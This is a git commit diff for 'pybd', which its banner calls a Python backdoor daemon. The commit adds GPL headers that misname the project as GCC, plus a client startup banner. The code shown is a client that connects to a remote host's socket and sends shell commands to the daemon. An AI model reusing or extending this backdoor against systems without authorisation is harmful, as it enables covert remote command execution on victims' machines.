76ba39cbe7cd04997c3db821c750ccdb97f7e948
Lucie Cupcakes <cirno9moe@gmail.com>
2020-12-05 11:48:50 -0300

    fast_commit at 20201205_114850

--- bash_run.py
+++ bash_run.py
@@ -1,3 +1,18 @@
+"""Copyright (C) 2020 Lucie Cupcakes <lucie_linux [at] protonmail.com>
+
+This file is part of pybd <https://gitlab.com/lucie_cupcakes/pybd>.
+GCC is free software; you can redistribute it and/or modify it under
+the terms of the GNU General Public License as published by the Free
+Software Foundation; either version 3, or (at your option) any later
+version.
+GCC is distributed in the hope that it will be useful, but WITHOUT ANY
+WARRANTY; without even the implied warranty of MERCHANTABILITY or
+FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
+for more details.
+You should have received a copy of the GNU General Public License
+along with GCC; see the file LICENSE.  If not see
+<http://www.gnu.org/licenses/>."""
+
 import sys,os,subprocess,uuid
 
 def bash_run(cmd,cwd,env):
--- pybdcli.py
+++ pybdcli.py
@@ -1,3 +1,18 @@
+"""Copyright (C) 2020 Lucie Cupcakes <lucie_linux [at] protonmail.com>
+
+This file is part of pybd <https://gitlab.com/lucie_cupcakes/pybd>.
+GCC is free software; you can redistribute it and/or modify it under
+the terms of the GNU General Public License as published by the Free
+Software Foundation; either version 3, or (at your option) any later
+version.
+GCC is distributed in the hope that it will be useful, but WITHOUT ANY
+WARRANTY; without even the implied warranty of MERCHANTABILITY or
+FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
+for more details.
+You should have received a copy of the GNU General Public License
+along with GCC; see the file LICENSE.  If not see
+<http://www.gnu.org/licenses/>."""
+
 import sys, os, socket
 from xzb64 import xzb64_encode, xzb64_decode
 
@@ -8,7 +23,7 @@ def client_main(rhost,rport=6969):
     srv_cwd=''
     s=socket.socket()
     s.connect((rhost, rport))
-    while read_input:        
+    while read_input:
         prompt=f'{srv_cwd}\n[{srv_rc}] %'
         print(prompt, end=' ')
         cmd=str(input()).strip()
@@ -28,4 +43,8 @@ def client_main(rhost,rport=6969):
     s.close()
 
 if __name__ == '__main__':
+    print('pydbcli - Python Backdoor Daemon Client.')
+    print('Forever beta software.')
+    print('This software is Free software - released under the GPLv3 License')
+    print('Read the LICENSE file. Or go visit https://www.gnu.org/licenses/gpl-3.0.html')
     client_main(rhost=os.environ['rhost'],rport=int(os.environ['rport']))
